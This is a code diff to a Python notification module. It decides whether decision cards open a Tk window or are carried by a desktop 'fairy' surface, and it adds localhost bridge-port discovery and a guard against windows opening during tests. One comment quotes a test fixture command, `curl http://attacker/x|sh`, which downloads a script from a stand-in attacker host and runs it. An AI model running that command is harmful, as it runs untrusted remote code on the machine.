@@ -28,14 +28,19 @@ and their clicks led nowhere — the launch URL had no registered handler
 badge, the desk deck and the Discord fanout are the bells. DTOAST001 asserts
 both twin copies stay free of Windows toast code.
 
-And since 2026-10-05 the WINDOW itself yields to the desk. Owner, on the two
-parallel dialogues: the awask notifications and decisions "need to actually
-come up in awdesk ... not a separate thing". awdesk is always on screen and
-watches the card store directly, so while its liveness heartbeat is fresh
-(:func:`desk_alive`) a raise delivers to the DESK and does NOT spawn the
-standalone Tk window beside it — one ask, one surface. When the heartbeat is
-missing or stale (the desk is not running, or died without cleaning up) the
-Tk window is back on the very next raise.
+The 2026-10-05 rule that the WINDOW yields to the desk is REVERSED (owner,
+2026-11-07): the desk files a card in its inbox and badge, which is not in front
+of him, so a live desk no longer suppresses the card window -- the raise always
+delivers to the desk AND spawns the window. The old behaviour is one file away,
+not one code change: ``~/.aither/decisions/.desk-only`` restores it.
+
+The in-front surface is now the desk FAIRY when it claims attention (owner,
+2026-11-08: "cards keep popping up and I can't even move them; these need to
+live in the fairy"). While the desk's fresh heartbeat carries
+``"attention": "fairy"`` (:func:`desk_attention_claim`) the fairy is on screen
+running its nudge and escalation engine, so the card IS in front of him and the
+Tk window is not spawned beside it. No claim, a stale heartbeat or an unreadable
+one all fall back to the window.
 """
 
 from __future__ import annotations
@@ -68,6 +73,101 @@ DESK_ALIVE_FILENAME = ".desk-alive"
 #: this is more than four missed beats; the file must read as dead well before a
 #: raise is lost, because the cost of guessing wrong is a card nobody sees.
 DESK_ALIVE_STALE_SECONDS = 90.0
+
+#: The heartbeat key the desk sets while one of its surfaces owns the owner's
+#: attention, and the one value that surface may claim. Absent = no claim.
+DESK_ATTENTION_KEY = "attention"
+DESK_ATTENTION_FAIRY = "fairy"
+
+#: The heartbeat is ``{"pid":…,"at":…}`` plus at most a claim; anything far larger
+#: is not a heartbeat, and is not worth reading on the raise path.
+_DESK_ALIVE_MAX_BYTES = 64 * 1024
+
+#: The port the desk bridge falls back to when nobody persisted a pick.
+DESK_BRIDGE_DEFAULT_PORT = 47931
+
+#: Where awdesk's launcher persists the port it actually bound
+#: (``%APPDATA%\\Desk\\bridge-port.txt``). Hyper-V/WSL reserved TCP ranges move, so a
+#: pinned port can come up dead after a reboot; the launcher picks and persists one.
+DESK_PORT_FILE = Path("Desk") / "bridge-port.txt"
+
+
+def desk_bridge_port_file() -> Path:
+    """The port file awdesk's launcher writes on THIS machine.
+
+    Twin of the platform's ``desk_bridge.py`` -- copied, not imported: this module
+    also ships inside the standalone ``awask`` package, which has no AitherOS tree.
+    """
+    appdata = os.environ.get("APPDATA") or os.environ.get("XDG_CONFIG_HOME")
+    base = Path(appdata) if appdata else Path.home() / ".config"
+    return base / DESK_PORT_FILE
+
+
+def desk_bridge_port(default: int = DESK_BRIDGE_DEFAULT_PORT) -> int:
+    """The persisted desk-bridge port, else ``default``. Never raises.
+
+    A pinned 47931 was the whole failure on 2026-11-07: the bridge was listening on
+    the picked 49031 while every raise knocked on the dead default and returned
+    "desk bridge unreachable", so the owner's Inbox never came forward.
+    """
+    try:
+        text = desk_bridge_port_file().read_text(encoding="ascii", errors="replace").strip()
+        port = int(text)
+        return port if 0 < port < 65536 else default
+    except (OSError, ValueError):
+        return default
+
+
+def _bridge_answers(url: str, timeout: float = 0.3) -> bool:
+    """Does a bridge answer ``GET /health`` right now? A closed desk is normal."""
+    import urllib.request  # noqa: PLC0415 - only this resolver needs the network
+
+    try:
+        with urllib.request.urlopen(url + "/health", timeout=timeout) as resp:  # noqa: S310
+            return 200 <= int(getattr(resp, "status", 200) or 0) < 300
+    except Exception:  # noqa: BLE001 - refused, timeout and malformed all mean "no"
+        return False
+
+
+_bridge_url_cache: "tuple[float, str] | None" = None
+
+
+def _env_desk_bridge_url() -> str:
+    """``AWDESK_URL``; awsh hands ``AITHERSHELL_AWDESK_URL`` over as the EVENTS url."""
+    explicit = (os.getenv("AWDESK_URL") or os.getenv("AITHERSHELL_AWDESK_URL") or "").strip()
+    return explicit.rstrip("/").removesuffix("/events")
+
+
+def desk_bridge_url(host: str = "127.0.0.1",
+                    default: int = DESK_BRIDGE_DEFAULT_PORT,
+                    *, probe: bool = True) -> str:
+    """Where the live desk bridge answers, chosen by LIVENESS.
+
+    Candidates in order: the env URL, the port awdesk's launcher persisted, the
+    constant -- the first that answers ``GET /health`` within 300 ms. The FILE is a
+    record, not proof: measured 2026-11-07 10:45 PT the running desk (relaunched
+    without the Startup launcher) listened on 47931 while the file still said 49031,
+    so reading the file alone fails in the opposite direction. Nothing answering
+    means the desk is closed, which is normal; the file's port is then the answer.
+    """
+    global _bridge_url_cache
+    persisted = f"http://{host}:{desk_bridge_port(default)}"
+    if not probe:
+        return _env_desk_bridge_url() or persisted
+    now = time.monotonic()
+    if _bridge_url_cache is not None and now - _bridge_url_cache[0] < 30.0:
+        return _bridge_url_cache[1]
+    candidates: list[str] = []
+    explicit = _env_desk_bridge_url()
+    if explicit:
+        candidates.append(explicit)
+    for port in (desk_bridge_port(default), default):
+        url = f"http://{host}:{port}"
+        if url not in candidates:
+            candidates.append(url)
+    chosen = next((url for url in candidates if _bridge_answers(url)), persisted)
+    _bridge_url_cache = (now, chosen)
+    return chosen
 
 
 @dataclass
@@ -233,7 +333,9 @@ def desk_alive(store_dir: Optional[Path] = None) -> bool:
     awdesk's ``decision-cards.cjs``); the file's mtime is the
     liveness signal, and its CONTENT (``{"pid":…,"at":…}``) is informational —
     a killed app leaves the file behind, so existence alone proves nothing and a
-    heartbeat older than :data:`DESK_ALIVE_STALE_SECONDS` reads as dead.
+    heartbeat older than :data:`DESK_ALIVE_STALE_SECONDS` reads as dead. The one
+    content field that steers a raise is the attention claim, read by
+    :func:`desk_attention_claim` under this same staleness rule.
 
     Why this exists, in the owner's words (2026-10-05): the awask notifications
     and decisions "need to actually come up in awdesk … not a separate thing".
@@ -261,6 +363,49 @@ def desk_alive(store_dir: Optional[Path] = None) -> bool:
     # No lower bound on `age`: a heartbeat with an mtime slightly in the future
     # (same-machine clock jitter) is a desk that JUST wrote it, not a dead one.
     return age < DESK_ALIVE_STALE_SECONDS
+
+
+def desk_attention_claim(store_dir: Optional[Path] = None) -> str:
+    """The surface the desk says owns the owner's attention right now, or ``""``.
+
+    awdesk adds ``"attention": "fairy"`` to its ``.desk-alive`` heartbeat ONLY while
+    the fairy is visible and running its nudge/escalation engine; the key is absent
+    otherwise. While that claim is live, a raised card is already in front of the
+    owner (owner, 2026-11-08: these cards "need to live in the fairy"), so
+    :func:`notify` does not spawn the Tk window beside it.
+
+    The claim is only as good as the heartbeat that carries it, so it is judged by
+    the SAME staleness rule as :func:`desk_alive`: a desk that died with the fairy
+    up leaves the claim in a file nobody is refreshing. Every failure falls toward
+    the window — a stale, absent, unreadable, oversized, non-JSON or non-object
+    heartbeat, or a non-string value, all return ``""``.
+
+    Args:
+        store_dir: the card store directory; defaults to :func:`decisions_dir`.
+
+    Returns:
+        The claimed surface name (e.g. ``"fairy"``), stripped, or ``""`` for no
+        live claim. Never raises.
+    """
+    try:
+        beat = (Path(store_dir) if store_dir is not None else decisions_dir())
+        path = beat / DESK_ALIVE_FILENAME
+        if time.time() - path.stat().st_mtime >= DESK_ALIVE_STALE_SECONDS:
+            return ""
+        with path.open("rb") as handle:
+            raw = handle.read(_DESK_ALIVE_MAX_BYTES + 1)
+    except OSError:
+        return ""
+    if len(raw) > _DESK_ALIVE_MAX_BYTES:
+        return ""
+    try:
+        payload = json.loads(raw.decode("utf-8-sig"))
+    except (UnicodeDecodeError, ValueError):
+        return ""
+    if not isinstance(payload, dict):
+        return ""
+    claim = payload.get(DESK_ATTENTION_KEY)
+    return claim.strip() if isinstance(claim, str) else ""
 
 
 # ── starting the desk: where a credential ask goes when the desk is down ───────
@@ -296,6 +441,20 @@ class DeskLauncher:
     argv: list[str]
     how: str
 
+
+
+def desk_only() -> bool:
+    """True when ``~/.aither/decisions/.desk-only`` exists: a live desk is the ONLY
+    surface and the card window is not spawned beside it (the pre-2026-11-07 rule).
+
+    It shipped first as a hand edit in the GENERATED ``awask`` copy -- a file whose own
+    header says "regenerate instead, or the next run pays you back by reverting it" -- so
+    the rule lives here now, where the generator reads it from.
+    """
+    try:
+        return (Path.home() / ".aither" / "decisions" / ".desk-only").is_file()
+    except OSError:
+        return False
 
 def _split_command(cmd: str, *, windows: bool) -> list[str]:
     import shlex
@@ -445,11 +604,14 @@ def raise_desk_inbox(timeout: float = 4.0, card_id: Optional[str] = None) -> Opt
 
     if os.environ.get("PYTEST_CURRENT_TEST") or os.environ.get("AITHER_NO_GUI_PROMPT"):
         return "the desk Inbox is not raised under test"
-    base = (os.getenv("AWDESK_URL") or os.getenv("AITHERSHELL_AWDESK_URL")
-            or "http://127.0.0.1:47931").rstrip("/")
-    req = urllib.request.Request(base + "/console/open", method="POST",
-                                 data=json.dumps({"pane": "inbox", **({"card": card_id} if card_id else {})}
-                                                ).encode("utf-8"))
+    base = desk_bridge_url()
+    payload = {"pane": "inbox"}
+    if card_id:
+        payload["card"] = card_id
+    req = urllib.request.Request(
+        base + "/console/open", method="POST",
+        data=json.dumps(payload).encode("utf-8"),
+    )
     req.add_header("Content-Type", "application/json")
     try:
         with urllib.request.urlopen(req, timeout=timeout) as response:  # noqa: S310
@@ -473,6 +635,13 @@ def open_card_window(card_id: str) -> Optional[str]:
     that raised the card must not wait for that — an agent blocked on its own
     notification is the bug this feature exists to remove.
     """
+    # A TEST RUN MUST NEVER PUT A WINDOW ON THE OWNER'S SCREEN. Measured 2026-11-08:
+    # suites raising fixture cards ("Create new wake 'new-job'" running
+    # `curl http://attacker/x|sh`) into a temp store -- no desk heartbeat there --
+    # spawned real "DECISION NEEDED" windows in front of the owner. Same markers
+    # start_desk/raise_desk_inbox already honour.
+    if os.environ.get("PYTEST_CURRENT_TEST") or os.environ.get("AITHER_NO_GUI_PROMPT"):
+        return "card window not opened under test"
     argv = [sys.executable, "-m", "adk.decisions.popup", card_id]
     kwargs: dict = {
         "stdin": subprocess.DEVNULL,
@@ -574,20 +743,35 @@ def notify(card: DecisionCard, store: Optional[DecisionStore] = None) -> NotifyR
     # The card WINDOW is the primary channel. It is the only one that shows the
     # facts and the options, and the only one where clicking answers anything.
     #
-    # UNLESS the desk is up. awdesk is the always-on surface and watches this
-    # store directory itself, so while its heartbeat is fresh the card is
-    # ALREADY in front of the owner — the desk Inbox, the tray badge and the
-    # spoken line. Spawning the standalone Tk window beside it is the "separate
-    # dialogue" the owner vetoed (2026-10-05): one ask, one surface. The desk
-    # branch runs FIRST, before popup_enabled(): quiet holds the Tk window, but
-    # it must not turn a desk delivery into a lie about what happened.
+    # Owner, 2026-11-07, overriding the 2026-10-05 "one surface" rule: decision
+    # cards must be IN FRONT of him while he uses the desktop. The desk files a
+    # card in its inbox and badge, which is not in front (measured: desk alive,
+    # card in the store, nothing on screen). So a live desk no longer suppresses
+    # the window; the ``.desk-only`` kill-file restores the old behaviour without
+    # a code change. The desk branch still runs FIRST so its delivery is recorded
+    # and popup_enabled()/quiet cannot turn it into a lie about what happened.
+    #
+    # Owner, 2026-11-08: the in-front surface is now the desk FAIRY when it
+    # claims attention ("these need to live in the fairy"; the Tk window could not
+    # even be moved). While the fresh heartbeat says ``"attention": "fairy"`` the
+    # fairy carries the card -- nudges, then escalation -- and the window is not
+    # spawned. Only a live claim suppresses it: a stale, absent or unreadable
+    # claim falls TOWARD the window, which is the 2026-11-07 behaviour.
     #
     # Inside the quiet window we do NOT spawn a second one: a window already open
     # walks the queue itself when it is answered, so a burst of eight cards
     # produces one window showing eight in turn, not eight stacked windows
     # fighting for the same corner of the screen.
-    if desk_alive():
+    desk_up = desk_alive()
+    fairy = desk_up and desk_attention_claim() == DESK_ATTENTION_FAIRY
+    if desk_up:
         delivered.append("awdesk")
+    if fairy:
+        delivered.append("awdesk fairy")
+    if desk_up and desk_only():
+        skipped.append("card window (desk-only: ~/.aither/decisions/.desk-only)")
+    elif fairy:
+        skipped.append("card window (the desk fairy carries it: nudges and escalation)")
     elif not popup_enabled():
         held = quiet_reason()
         skipped.append(f"card window (held while quiet: {held})" if held
